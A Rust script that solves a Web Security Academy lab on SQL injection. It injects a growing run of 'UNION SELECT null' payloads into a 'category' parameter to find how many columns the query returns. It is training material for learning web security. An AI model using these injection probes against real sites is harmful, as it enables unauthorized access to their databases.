/***************************************************************************
*
* Lab: SQL injection UNION attack, determining the number of columns
*      returned by the query
*
* Hack Steps:
*      1. Inject payload into 'category' query parameter to determine
*         the number of columns
*      2. Add one additional null column at a time
*      3. Repeat this process, increasing the number of columns until you
*         receive a valid response
*
****************************************************************************/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0abc006a04661db7869a9f55009b00c1.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "category".yellow());
    io::stdout().flush().unwrap();

    for counter in 1..10 {
        let nulls = "null, ".repeat(counter);
        let payload = format!("' UNION SELECT {nulls}-- -").replace(", -- -", "-- -"); // remove the last comma to make the syntax valid

        println!("❯❯ Trying payload: {}", payload);

        let injection_response = fetch(&format!("/filter?category={payload}"));
        if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response) {
            println!("⦗#⦘ Number of columns: {}", counter.to_string().green());
            break;
        } else {
            continue;
        }
    }

    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn fetch(path: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn text_not_exist_in_response(text: &str, response: Response) -> bool {
    let body = response.text().unwrap();
    let regex = Regex::new(text).unwrap();
    if regex.find(&body).is_none() {
        true
    } else {
        false
    }
}
